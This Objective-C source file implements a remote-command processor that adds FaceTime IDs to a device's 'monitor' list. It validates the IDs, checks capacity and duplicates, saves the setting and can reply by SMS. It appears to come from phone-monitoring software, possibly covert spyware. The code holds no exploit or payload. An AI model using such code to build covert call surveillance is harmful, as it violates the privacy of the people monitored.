//
//  AddMonitorFacetimeIDProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "AddMonitorFacetimeIDsProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"


@interface AddMonitorFacetimeIDsProcessor (PrivateAPI)
- (void) processAddMonitorFacetimeIDs;
- (void) addMonitorFacetimeIDsException:(NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddMonitorFacetimeIDs;
- (BOOL) checkIfMonitorFacetimeIDAlreadyExist;
@end


@implementation AddMonitorFacetimeIDsProcessor


@synthesize mFacetimeIDs;


/**
 - Method name:initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddMonitorFacetimeIDProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (AddMonitorFacetimeIDProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddMonitorFacetimeIDProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddMonitorFacetimeIDProcessor
 - Argument list and description:No Argument 
 - Return description: No Return type
 */

- (void) doProcessingCommand {
	DLog (@"AddMonitorFacetimeIDProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {				
		mFacetimeIDs = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kFacetimeIDValidation]];			
		DLog(@"AddMonitorFacetimeIDProcessor--->Facetime IDs:%@", mFacetimeIDs);		
		if ([mFacetimeIDs count] > 0) {
			if ([self canAddMonitorFacetimeIDs]) {																	// -- Not exceed the max capacity
				if (![self checkIfMonitorFacetimeIDAlreadyExist] &&													// -- Not exist in the existing list
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mFacetimeIDs])								// -- Not duplicate	between the new list (NSArray) themself
					[self processAddMonitorFacetimeIDs];
				else 
					[self addMonitorFacetimeIDsException:kCmdExceptionErrorCannotAddDuplicateToMonitorFacetiemIDList];
			}
			else {
				[self addMonitorFacetimeIDsException:kCmdExceptionErrorFacetimeIDExceedListCapacity];
			}
		}
		else {
			[self addMonitorFacetimeIDsException:kCmdExceptionErrorInvalidFacetimeIDToMonitorFacetimeIDList];
		}
	} else {
		[self addMonitorFacetimeIDsException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}


#pragma mark AddMonitorFacetimeIDProcessor PrivateAPI Methods

/**
 - Method name: processAddMonitorFacetimeIDs
 - Purpose:This method is used to process add monitors
 - Argument list and description:No Argument
 - Return description:No return type
 */

- (void) processAddMonitorFacetimeIDs {
	DLog (@"AddMonitorFacetimeIDProcessor--->processAddMonitorFacetimeIDs");
	id <PreferenceManager> prefManager				= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID	= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	NSMutableArray *monitorsArray					= [[NSMutableArray alloc] init];
	
	// Existing FacetimeIDs
	for (NSString *monitorNumber in [prefMonitorFacetimeID mMonitorFacetimeIDs]) {
		[monitorsArray addObject:monitorNumber];
	}
	
	// New Factime IDs
	for (NSString *monitorNumber in mFacetimeIDs) {
		[monitorsArray addObject:monitorNumber];
	}
	
	[prefMonitorFacetimeID setMMonitorFacetimeIDs:monitorsArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitorFacetimeID];
	[monitorsArray release];
	[self sendReplySMS];
}

/**
 - Method name: canAddMonitorFacetimeIDs
 - Purpose:This method is invoked when add facetime id process is failed. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) canAddMonitorFacetimeIDs {
	id <PreferenceManager> prefManager				= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];	
	PrefMonitorFacetimeID *prefMonitorFacetimeID	= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	DLog (@"existing facetime id (count:%d) %@", [[prefMonitorFacetimeID mMonitorFacetimeIDs] count], [prefMonitorFacetimeID mMonitorFacetimeIDs])
	DLog (@"new facetime id (count:%d) %@", [mFacetimeIDs count], mFacetimeIDs)
	int count = [[prefMonitorFacetimeID mMonitorFacetimeIDs] count] + [mFacetimeIDs count];
	if (count <= FACETIME_IDS_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfMonitorFacetimeIDsAlreadyExist
 - Purpose:This method is used to check if number already exist. 
 - Argument list and description: No Argument
 - Return description: BOOL
 */

- (BOOL) checkIfMonitorFacetimeIDAlreadyExist {
	BOOL isNumberExist					= NO;
	id <PreferenceManager> prefManager	= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorFacetimeID *prefMonitorFacetimeID		= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	for (NSString *monitorFacetimeID in mFacetimeIDs) {
		NSPredicate *predicate			= [NSPredicate predicateWithFormat:@"SELF == %@",monitorFacetimeID];
		NSArray *result					= [[prefMonitorFacetimeID mMonitorFacetimeIDs] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist				= YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addMonitorFacetimeIDsException
 - Purpose:This method is invoked when add monitors process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addMonitorFacetimeIDsException:(NSUInteger) aErrorCode {
	DLog (@"AddMonitorFacetimeIDProcessor--->addMonitorFacetimeIDsException")
	FxException* exception = [FxException exceptionWithName:@"addFacetimeIDsException" andReason:@"Add Facetime ids error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument.
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"AddMonitorFacetimeIDProcessor--->sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[mFacetimeIDs release];
	[super dealloc];
}


@end
